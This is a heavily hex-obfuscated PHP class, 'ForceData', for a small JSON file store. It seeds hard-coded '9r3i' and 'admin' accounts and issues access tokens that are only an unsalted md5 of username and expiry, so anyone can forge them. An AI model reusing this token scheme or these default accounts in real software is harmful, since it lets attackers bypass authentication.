<?php
 class ForceData{ const version="\x31\x2e\x30\x2e\x30"; private $dir=null; private $diri=null; public function __construct(string $dir){ ${"\x64\x69\x72"}=preg_replace("\x2f\x5b\x5e\x30\x2d\x39\x61\x2d\x7a\x5f\x5d\x2b\x2f\x69",'',${"\x64\x69\x72"}); ${"\x72\x6f\x6f\x74"}=str_replace("\x5c\x2f","\x2f",__DIR__."\x2f\x66\x6f\x72\x63\x65\x2f\x64\x61\x74\x61\x2f"); ${"\x74\x68\x69\x73"}->{"\x64\x69\x72"}=str_replace("\x5c\x2f","\x2f",${"\x72\x6f\x6f\x74"}.${"\x64\x69\x72"}."\x2f\x64\x61\x74\x61\x2f"); if(!is_dir(${"\x74\x68\x69\x73"}->{"\x64\x69\x72"})){ @mkdir(${"\x74\x68\x69\x73"}->{"\x64\x69\x72"},0755,true); } ${"\x74\x68\x69\x73"}->{"\x64\x69\x72\x69"}=str_replace("\x5c\x2f","\x2f",${"\x72\x6f\x6f\x74"}.${"\x64\x69\x72"}."\x2f\x69\x6d\x61\x67\x65\x73\x2f"); if(!is_dir(${"\x74\x68\x69\x73"}->{"\x64\x69\x72\x69"})){ @mkdir(${"\x74\x68\x69\x73"}->{"\x64\x69\x72\x69"},0755,true); } ${"\x74\x68\x69\x73"}->{"\x66\x69\x72\x73\x74\x54\x6f\x75\x63\x68"}(); } private function firstTouch(){ ${"\x69\x6e\x64\x65\x78\x41\x72\x72\x61\x79"}=[ "\x3c\x3f\x70\x68\x70", "\x68\x65\x61\x64\x65\x72\x28\x22\x48\x54\x54\x50\x2f\x31\x2e\x31\x20\x34\x30\x31\x20\x55\x6e\x61\x75\x74\x68\x6f\x72\x69\x7a\x65\x64\x22\x29\x3b", "\x65\x78\x69\x74\x28\x22\x45\x72\x72\x6f\x72\x3a\x20\x34\x30\x31\x20\x55\x6e\x61\x75\x74\x68\x6f\x72\x69\x7a\x65\x64\x22\x29\x3b", ]; ${"\x69\x6e\x64\x65\x78"}=implode("\r\n",${"\x69\x6e\x64\x65\x78\x41\x72\x72\x61\x79"}); ${"\x69\x66\x69\x6c\x65"}=${"\x74\x68\x69\x73"}->{"\x64\x69\x72"}."\x69\x6e\x64\x65\x78\x2e\x70\x68\x70"; ${"\x69\x66\x69\x6c\x65\x69"}=${"\x74\x68\x69\x73"}->{"\x64\x69\x72\x69"}."\x69\x6e\x64\x65\x78\x2e\x70\x68\x70"; if(!is_file(${"\x69\x66\x69\x6c\x65"})){@file_put_contents(${"\x69\x66\x69\x6c\x65"},${"\x69\x6e\x64\x65\x78"});} if(!is_file(${"\x69\x66\x69\x6c\x65\x69"})){@file_put_contents(${"\x69\x66\x69\x6c\x65\x69"},${"\x69\x6e\x64\x65\x78"});} ${"\x75\x73\x65\x72\x73"}=[ [ "\x75\x6e\x61\x6d\x65"=>"\x39\x72\x33\x69", "\x75\x70\x61\x73\x73"=>"\x24\x32\x79\x24\x31\x30\x24\x6e\x38\x36\x4e\x55\x7a\x56\x2f\x58\x43\x54\x74\x67\x4d\x4d\x79\x61\x6c\x49\x48\x4e\x4f\x32\x37\x59\x55\x6f\x75\x48\x6c\x71\x41\x66\x7a\x44\x64\x6c\x66\x62\x42\x31\x6d\x74\x65\x30\x77\x52\x31\x37\x6d\x61\x58\x71", ], [ "\x75\x6e\x61\x6d\x65"=>"\x61\x64\x6d\x69\x6e", "\x75\x70\x61\x73\x73"=>"\x24\x32\x79\x24\x31\x30\x24\x4f\x43\x46\x44\x33\x65\x67\x74\x38\x31\x75\x42\x69\x56\x4d\x73\x7a\x42\x4a\x6f\x78\x65\x45\x62\x41\x6b\x43\x77\x71\x75\x49\x39\x61\x4c\x67\x59\x51\x38\x6f\x64\x43\x65\x6e\x56\x58\x62\x45\x6f\x70\x64\x6c\x42\x2e", ], ]; ${"\x75\x66\x69\x6c\x65"}=${"\x74\x68\x69\x73"}->{"\x64\x69\x72"}."\x5f\x5f\x75\x73\x65\x72\x2e\x6a\x73\x6f\x6e"; if(!is_file(${"\x75\x66\x69\x6c\x65"})){${"\x74\x68\x69\x73"}->{"\x64\x61\x74\x61"}("\x75\x73\x65\x72",${"\x75\x73\x65\x72\x73"});} return true; } final public static function globVar(string $key){ global ${"\x46\x4f\x52\x43\x45\x44\x41\x54\x41\x5f\x47\x4c\x4f\x42\x56\x41\x52"}; ${"\x46\x4f\x52\x43\x45\x44\x41\x54\x41\x5f\x47\x4c\x4f\x42\x56\x41\x52"}=is_array(${"\x46\x4f\x52\x43\x45\x44\x41\x54\x41\x5f\x47\x4c\x4f\x42\x56\x41\x52"}) ?${"\x46\x4f\x52\x43\x45\x44\x41\x54\x41\x5f\x47\x4c\x4f\x42\x56\x41\x52"}:[]; ${"\x61\x72\x67\x73"}=func_get_args(); if(isset(${"\x61\x72\x67\x73"}[1])){ ${"\x46\x4f\x52\x43\x45\x44\x41\x54\x41\x5f\x47\x4c\x4f\x42\x56\x41\x52"}[${"\x6b\x65\x79"}]=${"\x61\x72\x67\x73"}[1]; return true; }return isset(${"\x46\x4f\x52\x43\x45\x44\x41\x54\x41\x5f\x47\x4c\x4f\x42\x56\x41\x52"}[${"\x6b\x65\x79"}]) ?${"\x46\x4f\x52\x43\x45\x44\x41\x54\x41\x5f\x47\x4c\x4f\x42\x56\x41\x52"}[${"\x6b\x65\x79"}]:false; } public function dir(){ return ${"\x74\x68\x69\x73"}->{"\x64\x69\x72"}; } public function diri(){ return ${"\x74\x68\x69\x73"}->{"\x64\x69\x72\x69"}; } public function isValidPkey(string $pkey):bool{ ${"\x70\x61\x72\x73\x65"}=${"\x74\x68\x69\x73"}->{"\x70\x6b\x65\x79\x50\x61\x72\x73\x65"}(${"\x70\x6b\x65\x79"}); if(!${"\x70\x61\x72\x73\x65"}->{"\x76\x61\x6c\x69\x64"}||${"\x70\x61\x72\x73\x65"}->{"\x65\x78\x70\x69\x72\x65"}<time()){ return false; } ${"\x75\x73\x65\x72\x73"}=${"\x74\x68\x69\x73"}->{"\x66\x69\x6e\x64\x44\x61\x74\x61"}("\x75\x6e\x61\x6d\x65",${"\x70\x61\x72\x73\x65"}->{"\x75\x6e\x61\x6d\x65"},"\x75\x73\x65\x72"); if(!is_array(${"\x75\x73\x65\x72\x73"})||count(${"\x75\x73\x65\x72\x73"})<1){ return false; } ${"\x75\x73\x65\x72"}=array_values(${"\x75\x73\x65\x72\x73"})[0]; return ${"\x70\x61\x72\x73\x65"}->{"\x75\x6e\x61\x6d\x65"}===${"\x75\x73\x65\x72"}["\x75\x6e\x61\x6d\x65"]; } public function findById($id){ return ${"\x74\x68\x69\x73"}->{"\x66\x69\x6e\x64\x44\x61\x74\x61"}("\x69\x64",${"\x69\x64"}); } public function findData($key,$value,string $base="\x64\x61\x74\x61"){ ${"\x64\x61\x74\x61"}=${"\x74\x68\x69\x73"}->{"\x64\x61\x74\x61"}(${"\x62\x61\x73\x65"}); ForceData::globVar("\x6b\x65\x79",${"\x6b\x65\x79"}); ForceData::globVar("\x76\x61\x6c\x75\x65",${"\x76\x61\x6c\x75\x65"}); return array_filter(${"\x64\x61\x74\x61"},function($v){ ${"\x6b\x65\x79"}=ForceData::globVar("\x6b\x65\x79"); ${"\x76\x61\x6c\x75\x65"}=ForceData::globVar("\x76\x61\x6c\x75\x65"); return isset(${"\x76"}[${"\x6b\x65\x79"}])&&$v[${"\x6b\x65\x79"}]==${"\x76\x61\x6c\x75\x65"}; }); } public function data(string $dname="\x64\x61\x74\x61",$ndata=false){ ${"\x6e\x61\x6d\x65"}="\x5f\x5f".${"\x64\x6e\x61\x6d\x65"}."\x2e\x6a\x73\x6f\x6e"; if(is_array(${"\x6e\x64\x61\x74\x61"})){ return ${"\x74\x68\x69\x73"}->{"\x77\x72\x69\x74\x65"}(${"\x6e\x61\x6d\x65"},@json_encode(${"\x6e\x64\x61\x74\x61"})); } if(!is_file(${"\x74\x68\x69\x73"}->{"\x64\x69\x72"}.${"\x6e\x61\x6d\x65"})){ ${"\x74\x68\x69\x73"}->{"\x77\x72\x69\x74\x65"}(${"\x6e\x61\x6d\x65"},"\x5b\x5d"); } ${"\x72\x61\x77"}=${"\x74\x68\x69\x73"}->{"\x72\x65\x61\x64"}(${"\x6e\x61\x6d\x65"}); ${"\x64\x61\x74\x61"}=@json_decode(${"\x72\x61\x77"},true); return is_array(${"\x64\x61\x74\x61"})?${"\x64\x61\x74\x61"}:[]; } public function read(string $name):string{ ${"\x66\x69\x6c\x65"}=${"\x74\x68\x69\x73"}->{"\x64\x69\x72"}.${"\x6e\x61\x6d\x65"}; ${"\x6f"}=fopen(${"\x66\x69\x6c\x65"},"\x72\x62"); if(!is_resource(${"\x6f"})){return '';} ${"\x72"}=fread(${"\x6f"},filesize(${"\x66\x69\x6c\x65"})); fclose(${"\x6f"}); return ${"\x72"}; } public function write(string $name,string $content=''){ ${"\x66\x69\x6c\x65"}=${"\x74\x68\x69\x73"}->{"\x64\x69\x72"}.${"\x6e\x61\x6d\x65"}; ${"\x6f"}=fopen(${"\x66\x69\x6c\x65"},"\x77\x62"); if(!is_resource(${"\x6f"})){return 0;} ${"\x77"}=fwrite(${"\x6f"},${"\x63\x6f\x6e\x74\x65\x6e\x74"}); fclose(${"\x6f"}); return ${"\x77"}; } public function toSlug(string $name):string{ return preg_replace("\x2f\x5b\x5e\x30\x2d\x39\x61\x2d\x7a\x5d\x2b\x2f","\x2d",strtolower(trim(${"\x6e\x61\x6d\x65"}))); } public function pkeyCreate(string $uname,int $expire):string{ ${"\x65\x78"}=base_convert(${"\x65\x78\x70\x69\x72\x65"},10,36); ${"\x68\x61\x73\x68"}=preg_replace("\x2f\x5b\x5e\x30\x2d\x39\x61\x2d\x7a\x5d\x2b\x2f",'',strtolower(base64_encode(md5(${"\x75\x6e\x61\x6d\x65"}.${"\x65\x78\x70\x69\x72\x65"},true)))); return implode("\x2e",[ ${"\x75\x6e\x61\x6d\x65"}, ${"\x65\x78"}, ${"\x68\x61\x73\x68"}, ]); } private function pkeyParse(string $pkey){ ${"\x72\x61\x77"}=explode("\x2e",${"\x70\x6b\x65\x79"}); if(count(${"\x72\x61\x77"})!=3){return false;} ${"\x75\x6e\x61\x6d\x65"}=${"\x72\x61\x77"}[0]; ${"\x65\x78\x70\x69\x72\x65"}=base_convert(${"\x72\x61\x77"}[1],36,10); ${"\x68\x61\x73\x68"}=preg_replace("\x2f\x5b\x5e\x30\x2d\x39\x61\x2d\x7a\x5d\x2b\x2f",'',strtolower(base64_encode(md5(${"\x75\x6e\x61\x6d\x65"}.${"\x65\x78\x70\x69\x72\x65"},true)))); return (object)[ "\x75\x6e\x61\x6d\x65"=>${"\x75\x6e\x61\x6d\x65"}, "\x65\x78\x70\x69\x72\x65"=>${"\x65\x78\x70\x69\x72\x65"}, "\x6b\x65\x79"=>${"\x72\x61\x77"}[2], "\x68\x61\x73\x68"=>${"\x68\x61\x73\x68"}, "\x76\x61\x6c\x69\x64"=>${"\x68\x61\x73\x68"}===${"\x72\x61\x77"}[2], ]; } } 